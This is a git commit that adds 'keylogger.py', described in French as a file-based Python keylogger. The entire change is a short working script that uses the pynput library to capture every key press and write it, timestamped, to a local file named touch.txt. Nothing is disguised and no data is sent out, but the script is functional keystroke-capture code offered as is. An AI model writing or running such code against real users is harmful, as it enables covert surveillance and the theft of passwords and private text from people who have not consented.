4038b94c03f0ee5f52eb035aaed9ed9cbede4f4f
Aureo30 <101021276+Aureo30@users.noreply.github.com>
2022-10-06 16:00:47 +0200

    Keylogger version 1
    keylogger en python dans une version fichier

---
+++ keylogger.py
@@ -0,0 +1,12 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+file = "touch.txt"
+
+logging.basicConfig(filename=file,level=logging.DEBUG,format="%(asctime)s %(message)s")
+
+def on_press(key):
+    logging.info(key)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
